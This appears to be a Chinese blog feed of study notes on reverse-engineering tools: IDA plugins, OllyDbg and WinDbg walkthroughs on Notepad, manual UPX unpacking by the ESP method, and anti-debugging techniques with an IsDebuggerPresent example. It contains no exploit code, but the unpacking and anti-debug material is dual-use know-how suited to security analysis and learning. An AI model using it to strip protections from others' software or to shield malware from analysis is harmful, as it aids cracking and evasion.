x86_64，ARM32、ARM64处理器产生的汇编代码。Hex-Rays仅以二进制格式发布，安装时，只需将提供的插件文件复制到/plugins目录即可。<br>使用时，反编译包含光标的函数，只需要通过View -&gt; Open Subview -&gt; Pseudocode(热键 F5)。若想反编译整个程序，使用File -&gt; Produce File -&gt; Create C File (热键 CTRL+F5)。</p><p>2.　IDAPython</p><p>IDAPython功能十分强大。目前在IDA Pro 5.4及以后版本都已经集成了。它在IDA中集成了Python解释器，使用这个插件还可以编写出能够实现IDC脚本语言所有功能的Python脚本。该插件的一个显著优势在于，它可以访问Python数据处理功能以及所有Python模块，此外它还具有IDA SDK的大部分功能，与使用IDC相比，使用它可以编写出来更强大的脚本。</p><p>3.　idaemu</p><p>在逆向工程二进制文件的过程中往往会需要手动追踪代码，以了解函数的行为。指令的模拟器会是一个十分有用的工具，它可以帮助你跟踪在执行一系列指令的过程中，注册表和CPU状态的变化情况。这个插件就是这样一个模拟器，可以在IDA Pro中模拟执行指令代码。目前支持的架构：X86(16, 32, 64bit)、ARM32、ARM64、MIPS。</p><h3 id="IDA-常用快捷键总结"><a href="#IDA-常用快捷键总结" class="headerlink" title="IDA 常用快捷键总结"></a>IDA 常用快捷键总结</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>功    能</strong></th></tr></thead><tbody><tr><td><strong>;</strong></td><td>为当前指令添加全文交叉引用的注释</td></tr><tr><td><strong>n</strong></td><td>定义或修改名称，通常用来标注函数名</td></tr><tr><td><strong>G</strong></td><td>跳转到任意地方观察代码</td></tr><tr><td><strong>Esc</strong></td><td>返回到跳转前的位置</td></tr><tr><td><strong>D</strong></td><td>分别按字节、字、双字的形式显示数据</td></tr><tr><td><strong>A</strong></td><td>按照ASCII形式显示数据</td></tr><tr><td><strong>F5</strong></td><td>一键反汇编</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OllyDbg初步学习总结与简单实战</title>
      <link href="2019/09/19/OllyDbg/"/>
      <url>2019/09/19/OllyDbg/</url>
      
        <content type="html"><![CDATA[<h3 id="OllyDbg核心功能介绍"><a href="#OllyDbg核心功能介绍" class="headerlink" title="OllyDbg核心功能介绍"></a>OllyDbg核心功能介绍</h3><p>OllyDbg（简称OD）是有Oleh Yuschuuk编写的一款具有可视化界面的用户模式调试器，可以在当前各种Windows版本上运行，但NT的系统架构更能发挥OllyDbg强大功能。OllyDbg结合了动态调试和静态分析，具有GUI界面，易上手，并且对异常的跟踪处理相当灵活，这些使得OllyDbg成为调试Ring 3级程序的首选工作。它的反汇编引擎很强大，可识别数千个被C和Windows频繁使用的函数，并能将其参数注释出。它会自动分析函数过程、循环语句、代码中的字符串等。</p><a id="more"></a><h3 id="OllyDbg加载自编译HelloWorld程序"><a href="#OllyDbg加载自编译HelloWorld程序" class="headerlink" title="OllyDbg加载自编译HelloWorld程序"></a>OllyDbg加载自编译HelloWorld程序</h3><p>Ollydbg加载程序之后，首先断在程序的入口点（EP），但这并不是main()函数的入口。一个比较简单的在Ollydbg中定位main()函数的方法就是找到call GetCommandLineA()之后继续往下找，接连三个压栈操作之后的call指令就是main()函数调用。进入之后就是main()函数的反汇编指令。</p><p> <img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehexmxevoj30n00c4e81.jpg" alt="img"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gehexyp8yvj30k40gsnpd.jpg" alt="img"> </p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7544sc00mj31ad0kr7c0.jpg" alt="img"> </p><h3 id="OllyDbg分析真实程序"><a href="#OllyDbg分析真实程序" class="headerlink" title="OllyDbg分析真实程序"></a>OllyDbg分析真实程序</h3><p>下面以windows中自带的记事本为例，利用OllyDbg进行一次简单的分析。首先将记事本Notepad.exe拉到OllyDbg中，打开后主界面如下图所示。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7544z4o8lj31fc0u0q5g.jpg" alt="img"> </p><p>这个整体的大窗口就是CPU窗口，总体由四部分组成。</p><p>首先第1部分就是反汇编窗口，反汇编部分由4个区域组成,最左边的是地址区域,显示了对应的指令在程序的内存空间中的地址(虚拟地址).其次是机器码,显示了这条汇编指令所对应的机器码,第3个区域是反汇编区,显示的是反汇编指令,第4个区域是注释区域,Ollydbg会在该区域自动添加一些注释,例如函数的参数提示等,鼠标在上面双击可以添加自己的注释.</p><p>第2部分就是寄存器区，显示了当前所选线程的CPU寄存器内容。</p><p>第3部分是内存数据窗口,以16进制和ASCII码形式显示程序的内存数据.</p><p>第4部分为堆栈窗口，它显示了当前线程的栈。</p><p>我们通过查询得知，记事本保存文件就是调用了Kernel32中的WriteFile。我们以此为目标设置断点。鼠标右键—&gt;查找—&gt;所有模块间的调用—&gt;点击目标文件从上至下进行排序—&gt;查找“Writefile”—&gt;右键“在每个调用到WriteFile上设置断点”。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g75454gs4oj31f20pa75i.jpg" alt="img"> </p><p>点击运行后，在记事本内随意输入测试内容文字然后保存；点击“保存”按钮后，程序中断在01004C2A处的WriteFile；</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g75459aa1sj30lu04it8r.jpg" alt="img"> </p><p>此时观察右下角的堆栈窗口，发现了输入的测试内容“testtest12345”.</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g75479cebgj30n20cwdjl.jpg" alt="img"> </p><p>则本次调试结束，关闭窗口保存调试结果。</p><h3 id="OllyDbg常用命令总结"><a href="#OllyDbg常用命令总结" class="headerlink" title="OllyDbg常用命令总结"></a>OllyDbg常用命令总结</h3><table><thead><tr><th><strong>快捷键</strong></th><th><strong>功    能</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>F8</strong></td><td>单步执行</td><td>遇到函数调用指令不跟入(Step over)</td></tr><tr><td><strong>F7</strong></td><td>单步执行</td><td>遇到函数调用指令跟入(Step in)</td></tr><tr><td><strong>F2</strong></td><td>设置断点</td><td>在一条指令上设置断点</td></tr><tr><td><strong>F4</strong></td><td>执行到当前光标所选中的指令</td><td>在遇到循环时可以方便地执行到循环结束位置</td></tr><tr><td><strong>F9</strong></td><td>运行程序</td><td>运行程序直到遇到断点</td></tr><tr><td><strong>Ctrl+G</strong></td><td>查看任意位置的数据</td><td>在指令区、栈区、内存区都可以使用，可以方便地查看任意位置的指令和数据</td></tr><tr><td><strong>CTR+F9</strong></td><td>执行到返回。</td><td>此命令在执行到一个 ret (返回指令)指令时暂停，常用于从系统区域返回到我们调试的程序区域。</td></tr><tr><td><strong>ALT+F9</strong></td><td>执行到用户代码。</td><td>可用于从系统区域快速返回到我们调试的程序区域。</td></tr></tbody></table><h3 id="OllyDbg插件使用"><a href="#OllyDbg插件使用" class="headerlink" title="OllyDbg插件使用"></a>OllyDbg插件使用</h3><p>插件是一个DLL文件，存放在OllyDbg的目录中，用于增加OllyDbg的功能。 你可以从OllyDbg的主页上( <a href="http://home.t—online.de/home/Ollydbg)%E5%85%8D%E8%B4%B9%E4%B8%8B%E8%BD%BD%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7%E5%8C%85plug110.zip%E3%80%82">http://home.t—online.de/home/Ollydbg)免费下载插件开发工具包plug110.zip。</a> </p><p>插件可以设置断点，增加标签和注释，修改寄存器和内存。插件可以添加到主菜单和很多的窗口(比如反汇编窗口、内存窗口)的快捷菜单中，也可以拦截快捷键。插件还可以创建MDI(多文档界面)窗口。插件还可以根据模块信息和 OllyDbg.ini文件，将自己数据写到.udd文件中;并能读取描述被调试程序的各种数据结构。插件API包含了多达170个函数。 </p><p>OllyDbg的插件安装简单，使用方便。将下载的插件压缩包解压到OllyDbg的安装目录下的 PLUGIN 目录中就可以了，然后重启OllyDbg会自动识别，在Plugins菜单下即可看到新装的插件；一般是一个dll文件，有的可能还有一个ini配置文件。要注意的是 OllyDBG 1.10 对插件的个数有限制，最多不能超过 32 个，否则会出错，因此建议插件不要添加的太多。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7547imda1j30y60c874d.jpg" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WinDbg初步学习总结与简单实战</title>
      <link href="2019/09/19/WinDbg/"/>
      <url>2019/09/19/WinDbg/</url>
      
        <content type="html"><![CDATA[<h3 id="WinDbg核心功能介绍"><a href="#WinDbg核心功能介绍" class="headerlink" title="WinDbg核心功能介绍"></a>WinDbg核心功能介绍</h3><p>WinDbg是在windows平台下，强大的用户态和内核态调试工具。它能够通过dmp文件轻松的定位到问题根源，可用于分析蓝屏、程序崩溃（IE崩溃）原因，是我们日常工作中必不可少的一个有力工具，学会使用它，将有效提升我们的问题解决效率和准确率。</p><a id="more"></a><h3 id="WinDbg加载自编译HelloWorld程序"><a href="#WinDbg加载自编译HelloWorld程序" class="headerlink" title="WinDbg加载自编译HelloWorld程序"></a>WinDbg加载自编译HelloWorld程序</h3><p>本部分使用的helloworld源程序与之前相比没有改动，唯一需要注意的是在使用visual c++生成文件时需要生成.pdb文件,它是该应用程序相应的符号文件，若没有它调试将变得十分困难。</p><p>打开windbg，点击：File-&gt;Open Executable，选中编译好的helloworld.exe文件。随后我们使用lm命令查看一下加载了那些模块。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753vsdxmaj30wr06uq3k.jpg" alt="img"> </p><p>我们想要运行到HelloWorld.exe的main函数中停下，可以使用!dh -a helloworld命令，用来在所有头部文件中搜索helloworld关键词，需要注意的是这里呈现的地址结果是相对虚拟地址（RVA），并非真实地址。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753vwi9jfj30zk0igdjn.jpg" alt="img"> </p><p>从图中可得它的想对虚拟地址为0x3510，由开始lm命令中可知，helloworld模块的起始地址为0x00400000，这两个十六进制相加结果为0x403510，此即为main函数真实地址，我们使用bp命令在该处进行断点，bl可以看到断点的详情。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753w084alj30yg0a43yj.jpg" alt="img"> </p><p>随后使用g命令运行，成功命中0号断点</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753w3mgeoj30yg08c0so.jpg" alt="img"> </p><p>此时对应的Disassembly窗口显示如下图所示</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753w6tj0ej31060dqwer.jpg" alt="img"> </p><p>此时即为helloworld入口点main处。事实上还有另一种更为轻松的方式来寻找入口点main，我们在windbg的命令行中直接输入bp main，让其自行判断main的位置并设置断点，但是断的位置可能并不十分精准，mainCRTStartup才是真正的程序入口点。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753wb03h8j319407waa9.jpg" alt="img"> </p><h3 id="WinDbg分析真实程序"><a href="#WinDbg分析真实程序" class="headerlink" title="WinDbg分析真实程序"></a>WinDbg分析真实程序</h3><p>下面我们以windows自带的记事本为例进行简单调试。首先打开WinDbg，在”文件” 菜单上, 选择 “打开可执行文件”。 在 “打开可执行文件” 对话框中, 导航到包含 notepad.exe 的文件夹 (例如, C:\Windows\System32)。 对于 “文件名”, 请输入 notepad.exe。 单击“打开” 。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753wh4010j30j40ekwiw.jpg" alt="img"> </p><p>此时若要查看Notepad.exe各个模块的符号，可以输入该命令：<a href="https://go.microsoft.com/fwlink/p?linkid=399240">x notepad!*</a></p><p>随后将会看到结果的输出。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753wlfpr2j30k00bu0vr.jpg" alt="img"> </p><p>若要查看Notepad.exe 模块中包含 main 的符号, 可以命令：<a href="https://go.microsoft.com/fwlink/p?linkid=399240">x notepad!<em>main</em></a></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753wp1s8fj30lu03yq3l.jpg" alt="img"> </p><p>在记事本上设置断点notepad!WinMain，输入以下命令：<a href="http://go.microsoft.com/fwlink/p?linkid=399390">bu notepad!WinMain</a></p><p>要验证是否设置了断点，请输入以下命令：<a href="http://go.microsoft.com/fwlink/p?linkid=399391">bl</a></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753wsbf0cj30ls03edg0.jpg" alt="img"> </p><p>运行，请输入以下命令：<a href="http://go.microsoft.com/fwlink/p?linkid=399388">g</a></p><p>记事本一直运行到winmain函数，然后中断到调试器。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753ww2ju9j30ks02y0ta.jpg" alt="img"> </p><p>此时要查看在记事本进程中加载的代码模块列表，请输入以下命令：<a href="http://go.microsoft.com/fwlink/p?linkid=399237">lm</a></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753x0a7gkj30g809e74t.jpg" alt="img"> </p><p>要查看堆栈跟踪，请输入以下命令：<a href="http://go.microsoft.com/fwlink/p?linkid=399389">k</a></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753x41aupj30mm040t96.jpg" alt="img"> </p><p>再次运行 <a href="http://go.microsoft.com/fwlink/p?linkid=399388">g</a>，要中断记事本执行，请从“调试”菜单中选择“中断”。</p><p>观察保存过程，要在zwwritefile处设置和验证断点，请输入以下命令：<a href="http://go.microsoft.com/fwlink/p?linkid=399390">bu ntdll!ZwWriteFile</a>和<a href="http://go.microsoft.com/fwlink/p?linkid=399391">bl</a>。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753x8q76aj30dw020jrk.jpg" alt="img"> </p><p>输入g重新开始运行记事本。在记事本窗口中，输入一些文本，然后从“文件”菜单中选择“保存”。当涉及zwCreateFile时，正在运行的代码将中断。输入k以查看堆栈跟踪。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753xcxf6gj319y0jg74o.jpg" alt="img"> </p><p>在windbg窗口的命令行左侧，注意处理器和线程号。在本例中，当前处理器编号为0，当前线程编号为2。因此，我们正在查看线程2的堆栈跟踪（它恰好运行在处理器0上）。要查看记事本进程中所有线程的列表，请输入以下命令：~</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753xh4ztxj30n402adg1.jpg" alt="img"> </p><p>要查看线程0的堆栈跟踪，请输入以下命令：～0s，并输入k查看详情。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g753xp2vz4j318i0me3yx.jpg" alt="img"> </p><p>要退出调试并从记事本进程中分离，请输入以下命令： <a href="http://go.microsoft.com/fwlink/p?linkid=399394">qd</a>，则本次调试结束记事本程序关闭。</p><h3 id="WinDbg常用命令总结"><a href="#WinDbg常用命令总结" class="headerlink" title="WinDbg常用命令总结"></a>WinDbg常用命令总结</h3><table><thead><tr><th><strong>命令</strong></th><th><strong>含义</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>p</td><td>Step</td><td>单步步过</td></tr><tr><td>t</td><td>Trace</td><td>单步步入</td></tr><tr><td>pa</td><td>Step to Address</td><td>单步到指定地址 不进入子函数</td></tr><tr><td>ta</td><td>Trace to Address</td><td>追踪到指定地址 进入子函数</td></tr><tr><td>pc</td><td>Step to Next Call</td><td>单步执行到下一个函数调用</td></tr><tr><td>tc</td><td>Trace to Next Call</td><td>追踪执行到下一个函数调用</td></tr><tr><td>tb</td><td>Trace to Next Branch</td><td>追踪到下一条分支指令</td></tr><tr><td>g</td><td>Go</td><td>恢复运行</td></tr><tr><td>gu</td><td>Go Up</td><td>执行到函数返回</td></tr><tr><td>q</td><td>Quit</td><td>停止调试</td></tr><tr><td>.detach</td><td>detach</td><td>分离调试器</td></tr><tr><td>bp</td><td>设置软件断点</td><td>无</td></tr><tr><td>bu</td><td>对未加载的模块设置断点</td><td>无</td></tr><tr><td>bm</td><td>批量设置断点</td><td>无</td></tr><tr><td>ba</td><td>设置硬件断点</td><td>无</td></tr><tr><td>bl</td><td>列出所有断点</td><td>无</td></tr><tr><td>bc</td><td>删除断点</td><td>无</td></tr><tr><td>bd</td><td>禁止断点</td><td>无</td></tr><tr><td>be</td><td>启用断点</td><td>无</td></tr><tr><td>!address</td><td>显示内存信息</td><td>如内存范围、内存权限等。</td></tr></tbody></table><h3 id="WinDbg插件使用"><a href="#WinDbg插件使用" class="headerlink" title="WinDbg插件使用"></a>WinDbg插件使用</h3><p>Windbg也支持插件，winxp和winext是插件的默认搜索目录，插件要放在windbg根目录或插件文件夹中，加载后可以用命令“!插件名.help”来查看帮助，“!导出函数”来使用功能。加载插件用.load（直接使用!ext.xxx的方式也能加载ext插件），卸载用.unload，使用.chain能清晰看到当前加载的插件和搜索目录。</p><table><thead><tr><th>插件名称</th><th>主要功能</th></tr></thead><tbody><tr><td><a href="https://tuts4you.com/download.php?view.3564">AddSym</a></td><td>允许在IDA和WinDBG之间传输符号名称</td></tr><tr><td><a href="http://www.osronline.com/article.cfm?article=547">CmdHist</a></td><td>记录您在调试会话中执行的每个命令，以便您可以轻松地重新执行</td></tr><tr><td><a href="https://code.google.com/p/narly/">narly</a></td><td>列出了有关加载模块的信息，如使用SafeSEH，ASLR，DEP，/ GS(缓冲区安全检查)</td></tr><tr><td><a href="http://pykd.codeplex.com/">PyKD</a></td><td>允许Python用于脚本WinDBG</td></tr><tr><td><a href="https://code.google.com/p/windbgshark/">windbgshark</a></td><td>集成Wireshark协议分析器，以实现VM流量操纵和分析</td></tr><tr><td><a href="http://msecdbg.codeplex.com/">MSEC</a></td><td>提供自动崩溃分析和安全风险评估</td></tr><tr><td><a href="http://redmine.corelan.be/projects/mona">Mona</a>(需要PyKD)</td><td>帮助高级分析/查找漏洞的命令集</td></tr><tr><td><a href="http://core-analyzer.sourceforge.net/index_files/Page335.html">Core Analyzer</a></td><td>检查堆结构是否损坏，检测线程共享的对象等</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加壳脱壳初步学习总结与简单实战</title>
      <link href="2019/09/19/%E5%8A%A0%E5%A3%B3%E8%84%B1%E5%A3%B3/"/>
      <url>2019/09/19/%E5%8A%A0%E5%A3%B3%E8%84%B1%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>在一些计算机软件里有一段专门负责保护软件不被非法修改或反编译的程序。它们一般都是先于程序运行，拿到控制权，然后完成它们保护软件的任务。就像动植物的壳一般都是在身体外面一样理所当然。由于这段程序和自然界的壳在功能上有很多相同的地方，基于命名的规则，大家就把这样的程序称为“壳”。就像计算机病毒和自然界的病毒一样，其实都是命名上的方法罢了。</p><a id="more"></a><p>从功能上抽象，软件的壳和自然界中的壳相差无几。无非是保护、隐蔽壳内的东西。而从技术的角度出发，壳是一段执行于原始程序前的代码。原始程序的代码在加壳的过程中可能被压缩、加密等。当加壳后的文件执行时，壳－这段代码先于原始程序运行，他把压缩、加密后的代码还原成原始程序代码，然后再把执行权交还给原始代码。软件的壳分为加密壳、压缩壳等类，目的都是为了隐藏程序真正的OEP（入口点，防止被破解）。</p><p>程序员编写好软件后，编译成exe可执行文件。有一些信息需要保护起来、有时需要程序存储空间小一点、黑客给木马等加壳以躲避杀毒软件。实现上述功能的软件称为加壳软件。</p><p>软件脱壳，顾名思义，就是对软件加壳的逆操作，把软件上存在的壳去掉。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>所谓的“壳”就是一种对软件进行保护的加密程序，它可以具体分为三种：</p><p>（1）压缩壳</p><p>压缩壳的主要目的是压缩应用程序的体积，例如最稳定的UPX可以将一般的应用程序压缩到原体积的30%左右。</p><p>压缩壳并不会对被加壳程序本身做任何修改，而是直至将其换成一种更加节省空间的存储方式，其目的大致类似于我们经常使用的RAR或ZIP。经过压缩壳处理过的程序在真正被CPU执行前是会自动解压缩（解密）的。</p><p>（2）加密壳</p><p>加密壳的主要目的是保护原程序不被破解，一般情况下，经过加密壳处理的应用程序体积会增加，但也有部分加密壳结合了压缩壳的特性，会在加密完成后再进行压缩。</p><p>而且一般情况下，加密壳会对原程序进行一定的修改，例如代码乱序、代码混淆等，因此经过加密壳处理的程序即便是提交给CPU去执行，原程序的代码也还是发生了改变。</p><p>（3）虚拟机保护壳</p><p>虚拟机保护壳是近几年在软件安全领域内流行起来的一种非常强悍的加密保护方案。它的关键技术就在于实现了一个软件版的CPU，被加密的可执行代码已经不再遵守Intel制定的OPCode标准了，而是执行由虚拟机作者本身制定的非公开的、动态的CPU指令编码解码标准，我们通常称之为TextCode。</p><p>虚拟机保护壳会将被保护程序的可执行代码重新编码为自己的软件CPU可以识别的格式，并进行存储、加载及模拟执行。因此在任何时候，原程序代码对外界来说都将是一个彻底的黑盒，任何人都很难破解。</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>1.有一些版权信息需要保护起来，不想让别人随便改动，如作者的姓名，即为了保护软件不被破解，通常都是采用加壳来进行保护。<br>2.需要把程序搞的小一点，从而方便使用。于是，需要用到一些软件，它们能将exe可执行文件压缩。<br>3.在黑客界给木马等软件加壳脱壳以躲避杀毒软件。</p><h3 id="基本过程"><a href="#基本过程" class="headerlink" title="基本过程"></a>基本过程</h3><p>我们以使用频率较高的UPX为例，为大家简述加壳与手动解除UPX壳的过程，以加强各位对于加壳去壳这一过程的理解。</p><p>从官网下载UPX程序之后，就可以在命令行中使用它了。它的常见命令有两种，一种是加壳时用“upx.exe 目标程序”，另一种是对已经加壳的程序进行解壳“upx.exe -d 目标程序”。</p><p>我们将目标程序设定为之前的helloworld.exe，加壳过程如下所示。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754sgk4mhj30ru0fidl7.jpg" alt="img"> </p><p>加壳之后为了确定是否成功，我们使用PEiD来检测加壳后的程序，发现提示了UPX，说明加壳已经成功。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754stas53j30fo08sjua.jpg" alt="img"> </p><p>我们将加壳后的Helloworld拖入OllyDbg进行解析，通常情况下有三种脱壳的方法：单独跟踪法、ESP平衡法和一步到ESP法，这里我们为大家演示使用ESP平衡法脱壳的过程。</p><p>一般来说，外壳程序首先需要保存原程序的寄存器信息，等外壳程序恢复原程序的ESP寄存器的值，常常就到了OEP位置附近，这就是ESP平衡法的思路。</p><p>在我们将加壳程序拖入OD后，我们F8单步走走，同时注意右面寄存器FPU的显示，当有且只有ESP和EIP为红色时，我们就可以用ESP定律了。具体在下图中，我们走了一步，就发现只有ESP与EIP变红了。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754sz2hq2j31da0k7qe8.jpg" alt="img"> </p><p>此时我们在ESP后面的地址右键，选择在数据窗口跟随，这样在下面的内存数据窗口与堆栈窗口都会转移到该地址的位置，在本例中即数据窗口中跟随到0012FFA4这个地址，随后我们右键该地址中数值设置断点→硬件访问→word型。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754tmpj7cj30v40fwdlx.jpg" alt="image-20190919210937881"></p><p>随后我们正常运行程序（F9），此时程序会暂停在我们设置的断点位置。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754v9p6qrj30t20jeah9.jpg" alt="image-20190919211112002"> <img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754un7ym2j30qa0e00xy.jpg" alt="image-20190919211036343"></p><p>然后我们F8单步走，注意到了jnz位置后不要再按F8了（这是向上跳转的），我们用鼠标点击她的下一行然后按F4，让程序强制转到跳转下面继续运行，到达jmp后我们可以跳转，因为接下来有极大可能是程序的OEP。在jmp跳转后，我们就看到了该helloworld程序的OEP。</p><p> <img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754wcm78tj30t20jen2n.jpg" alt="image-20190919211112002"></p><p>之后我们就可以进行脱壳，但是为了避免脱壳过程受到影响，脱壳之前我们先把断点给清理掉。之后在OEP的程序第一行我们右键选择OD的脱壳调试选项。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754wxdox5j31h50u0tu9.jpg" alt="img"> </p><p>最终我们生成tk_helloworld.exe程序，检查后发现程序能够正常运行。将其拖入PEiD中发现信息已经改变，脱壳成功。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754x3sn7fj31lm0u0x6l.jpg" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人总结 </tag>
            
            <tag> 加壳脱壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反调试初步学习总结与简单实战</title>
      <link href="2019/09/19/%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
      <url>2019/09/19/%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>反调试是一种重要的软件保护技术，特别是在各种游戏保护中被尤其重视。另外，恶意代码往往也会利用反调试来对抗安全分析。当程序意识到自己可能处于调试中的时候，可能会改变正常的执行路径或者修改自身程序让自己崩溃，从而增加调试时间和复杂度。</p><a id="more"></a><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>以下是几种windows下的反调试方法：</p><p>（1）函数检测</p><p>函数检测就是通过Windows自带的公开或未公开的函数直接检测程序是否处于调试状态。</p><p>（2）数据检测</p><p>数据检测是指程序通过测试一些与调试相关的位置信息的数据来判断是否处于调试状态。</p><p>（3）符号检测</p><p>符号检测主要针对一些使用了驱动的调试器或监视器，这类调试器在启动后会创建相应的驱动链接符号，以用于应用层与其驱动的通信。但由于这些符号都比较固定，所以我们就可以通过这些符号来确定是否存在相应的调试软件。</p><p>（4）窗口检测</p><p>窗口检测通过检测当前桌面中是否存在特定的调试窗口来判断是否存在调试器，但不能判断该调试器是否正在调试该程序。</p><p>（5）特征码检测</p><p>特征码检测枚举当前正在运行的进程，并在进程的内存空间中搜索特定调试器的代码片段。</p><p>（6）行为检测</p><p>行为检测是指在程序中通过代码感知程序处于调试时与未处于调试时的各种差异来判断程序是否处于调试状态。</p><p>（7）断点检测</p><p>断点检测是根据调试器设置断点的原理来检测软件代码中是否设置了断点。</p><p>（8）行为占用</p><p>行为占用指的是在需要保护的程序中，程序自身将一些只能同时有一个实例的功能占为己有。</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>反调试技术常常用来保护关键性的程序或软件，一旦该程序被调试就会出现错误。</p><p>同时反调试技术也常常用于恶意代码的开发过程之中。恶意代码用它识别是否被调试，或者让调试器失效。恶意代码编写者意识到分析人员经常使用调试器来观察恶意代码的操作，因此他们使用反调试技术尽可能地延长恶意代码的分析时间。为了阻止调试器的分析，当恶意代码意识到自己被调试时，它们可能改变正常的执行路径或者修改自身程序让自己崩溃，从而增加调试时间和复杂度。</p><h3 id="基本过程"><a href="#基本过程" class="headerlink" title="基本过程"></a>基本过程</h3><p>下面我们以一个简单的函数检测为例，即自带的IsDebuggerPresent函数检测是否使用了调试器。基本的代码为：</p><pre><code class="c++">int main()&#123;if (IsDebuggerPresent())&#123;    cout &lt;&lt;&quot;朋友，你在使用调试器啊！&quot;&lt;&lt;endl;    system(&quot;pause&quot;);    exit(-1);&#125;else    cout &lt;&lt;&quot;success!&quot;&lt;&lt;endl;    system(&quot;pause&quot;);    return 0;&#125;</code></pre><p>编译截图如下所示：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754k5ujb8j30so0itjrz.jpg" alt="img"> </p><p>我们尝试一下在正常环境下打开和在OllyDbg中打开看看有什么不同。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754khkcdvj312v0d4wm3.jpg" alt="img"> </p><p>我们了解到，IsDebuggerPresent这个函数可以用在程序中检测当前程序是否被调试，若被调试从而退出，达到反调试的目的。我们将其拉入OllyDbg中查看一下该机制是如何运转的。</p><p>打开OD，正常载入程序，此时不要运行，搜索IsDebuggerPresent并在所有调用这个函数的地方下断点。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754kqvf1vj30vk0itmyt.jpg" alt="img"> </p><p>使用F9键运行，程序会断在做断点的地方，此后我们使用F8键一步一步的运行来分析程序，我们发现转到了下图的四句命令中，这四句是关键，我们会逐步分析。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754kwfpp0j30ie0audj8.jpg" alt="img"> </p><p>对于第一句mov eax, dword ptr fs:[18] ，它的意思为将地址为fs:[18]处的数据放到eax中，我们从下方的消息窗口能看到fs:[18]地址为7FFDF018，我们转到这个地址可以得知存的值为7FFDF000，则猜测eax中也为此值，继续F8单步运行。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754l1668rj30f208eju5.jpg" alt="img"> </p><p>执行此步时，可以看到右上角寄存器中eax的值印证了我们的猜测。对于第二句mov eax, dword ptr [eax+30]，这个时候是将偏移30字节的数据放到eax中。依旧按照第一句的查询方法可以发现对应的数据：7FFD8000。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754l5vt61j30wr09q42c.jpg" alt="img"> </p><p>继续执行F8，第三句movzx eax, byte ptr [eax+2]，是将刚刚eax中所得的值作为地址，再+2偏移的一个字节数据放到eax中，其它位置都补充为0.</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g754l9j8czj31ne0pc759.jpg" alt="img"> 